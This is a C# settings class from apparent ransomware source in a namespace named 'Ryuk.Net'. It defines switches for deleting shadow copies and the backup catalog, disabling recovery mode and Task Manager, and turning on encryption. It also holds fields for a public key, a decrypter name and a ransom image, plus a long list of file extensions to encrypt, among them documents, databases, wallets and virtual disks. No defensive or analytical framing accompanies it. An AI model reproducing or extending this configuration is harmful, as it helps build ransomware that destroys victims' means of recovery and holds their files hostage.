namespace Ryuk.Net.Properties
{
    using System;
    using System.CodeDom.Compiler;
    using System.Configuration;
    using System.Diagnostics;
    using System.Runtime.CompilerServices;

    [CompilerGenerated, GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "14.0.0.0")]
    internal sealed class Settings : ApplicationSettingsBase
    {
        private static Settings defaultInstance = ((Settings) Synchronized(new Settings()));

        public static Settings Default =>
            defaultInstance;

        [DefaultSettingValue("False"), DebuggerNonUserCode, UserScopedSetting]
        public bool checkAdminPrivilage
        {
            get => 
                (bool) this["checkAdminPrivilage"];
            set => 
                this["checkAdminPrivilage"] = value;
        }

        [DefaultSettingValue("False"), UserScopedSetting, DebuggerNonUserCode]
        public bool deleteShadowCopies
        {
            get => 
                (bool) this["deleteShadowCopies"];
            set => 
                this["deleteShadowCopies"] = value;
        }

        [UserScopedSetting, DefaultSettingValue("False"), DebuggerNonUserCode]
        public bool disableRecoveryMode
        {
            get => 
                (bool) this["disableRecoveryMode"];
            set => 
                this["disableRecoveryMode"] = value;
        }

        [DefaultSettingValue("False"), DebuggerNonUserCode, UserScopedSetting]
        public bool deleteBackupCatalog
        {
            get => 
                (bool) this["deleteBackupCatalog"];
            set => 
                this["deleteBackupCatalog"] = value;
        }

        [DefaultSettingValue("True"), UserScopedSetting, DebuggerNonUserCode]
        public bool encryptOption
        {
            get => 
                (bool) this["encryptOption"];
            set => 
                this["encryptOption"] = value;
        }

        [DefaultSettingValue(""), DebuggerNonUserCode, UserScopedSetting]
        public string publicKey
        {
            get => 
                (string) this["publicKey"];
            set => 
                this["publicKey"] = value;
        }

        [DebuggerNonUserCode, DefaultSettingValue(""), UserScopedSetting]
        public string decrypterName
        {
            get => 
                (string) this["decrypterName"];
            set => 
                this["decrypterName"] = value;
        }

        [DefaultSettingValue(""), UserScopedSetting, DebuggerNonUserCode]
        public string pathToBase64
        {
            get => 
                (string) this["pathToBase64"];
            set => 
                this["pathToBase64"] = value;
        }

        [UserScopedSetting, DefaultSettingValue(""), DebuggerNonUserCode]
        public string base64Image
        {
            get => 
                (string) this["base64Image"];
            set => 
                this["base64Image"] = value;
        }

        [UserScopedSetting, DebuggerNonUserCode, DefaultSettingValue("\".txt\",\".jar\",\".dat\",\".contact\",\".settings\",\".doc\",\".docx\",\".xls\",\".xlsx\",\".ppt\",\".pptx\",\".odt\",\".jpg\",\".mka\",\".mhtml\",\".oqy\",\".png\",\".csv\",\".py\",\".sql\",\".mdb\",\".php\",\".asp\",\".aspx\",\".html\",\".htm\",\".xml\",\".psd\",\".pdf\",\".xla\",\".cub\",\".dae\",\".indd\",\".cs\",\".mp3\",\".mp4\",\".dwg\",\".zip\",\".rar\",\".mov\",\".rtf\",\".bmp\",\".mkv\",\".avi\",\".apk\",\".lnk\",\".dib\",\".dic\",\".dif\",\".divx\",\".iso\",\".7zip\",\".ace\",\".arj\",\".bz2\",\".cab\",\".gzip\",\".lzh\",\".tar\",\".jpeg\",\".xz\",\".mpeg\",\".torrent\",\".mpg\",\".core\",\".pdb\",\".ico\",\".pas\",\".db\",\".wmv\",\".swf\",\".cer\",\".bak\",\".backup\",\".accdb\",\".bay\",\".p7c\",\".exif\",\".vss\",\".raw\",\".m4a\",\".wma\",\".flv\",\".sie\",\".sum\",\".ibank\",\".wallet\",\".css\",\".js\",\".rb\",\".crt\",\".xlsm\",\".xlsb\",\".7z\",\".cpp\",\".java\",\".jpe\",\".ini\",\".blob\",\".wps\",\".docm\",\".wav\",\".3gp\",\".webm\",\".m4v\",\".amv\",\".m4p\",\".svg\",\".ods\",\".bk\",\".vdi\",\".vmdk\",\".onepkg\",\".accde\",\".jsp\",\".json\",\".gif\",\".log\",\".gz\",\".config\",\".vb\",\".m1v\",\".sln\",\".pst\",\".obj\",\".xlam\",\".djvu\",\".inc\",\".cvs\",\".dbf\",\".tbi\",\".wpd\",\".dot\",\".dotx\",\".xltx\",\".pptm\",\".potx\",\".potm\",\".pot\",\".xlw\",\".xps\",\".xsd\",\".xsf\",\".xsl\",\".kmz\",\".accdr\",\".stm\",\".accdt\",\".ppam\",\".pps\",\".ppsm\",\".1cd\",\".3ds\",\".3fr\",\".3g2\",\".accda\",\".accdc\",\".accdw\",\".adp\",\".ai\",\".ai3\",\".ai4\",\".ai5\",\".ai6\",\".ai7\",\".ai8\",\".arw\",\".ascx\",\".asm\",\".asmx\",\".avs\",\".bin\",\".cfm\",\".dbx\",\".dcm\",\".dcr\",\".pict\",\".rgbe\",\".dwt\",\".f4v\",\".exr\",\".kwm\",\".max\",\".mda\",\".mde\",\".mdf\",\".mdw\",\".mht\",\".mpv\",\".msg\",\".myi\",\".nef\",\".odc\",\".geo\",\".swift\",\".odm\",\".odp\",\".oft\",\".orf\",\".pfx\",\".p12\",\".pl\",\".pls\",\".safe\",\".tab\",\".vbs\",\".xlk\",\".xlm\",\".xlt\",\".xltm\",\".svgz\",\".slk\",\".tar.gz\",\".dmg\",\".ps\",\".psb\",\".tif\",\".rss\",\".key\",\".vob\",\".epsp\",\".dc3\",\".iff\",\".onepkg\",\".onetoc2\",\".opt\",\".p7b\",\".pam\",\".r3d\"")]
        public string extensions
        {
            get => 
                (string) this["extensions"];
            set => 
                this["extensions"] = value;
        }

        [DebuggerNonUserCode, DefaultSettingValue("False"), UserScopedSetting]
        public bool disableTaskManager
        {
            get => 
                (bool) this["disableTaskManager"];
            set => 
                this["disableTaskManager"] = value;
        }
    }
}
